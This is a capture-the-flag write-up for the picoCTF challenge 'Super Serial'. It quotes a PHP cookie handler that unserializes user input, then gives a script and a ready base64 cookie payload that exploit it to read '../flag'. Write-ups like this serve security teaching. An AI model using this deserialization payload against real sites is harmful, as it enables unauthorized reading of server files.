# Super Serial 

## Description
Try to recover the flag stored on this website [link](http://mercury.picoctf.net:42449/)
> 130 points
## Hints
The flag is at ../flag

## Solution

By looking at the `robots.txt` file we get the hint like that 
```
User-agent: *
Disallow: /admin.phps
```

appending `s` to all php file that we see to get the source code.

looking at the code in `cookie.php` file 
```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

```php
<?php
class access_log{
	public $log_file='../flag';
}

print(urlencode(base64_encode(serialize(new access_log()))));

?>
```

```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```
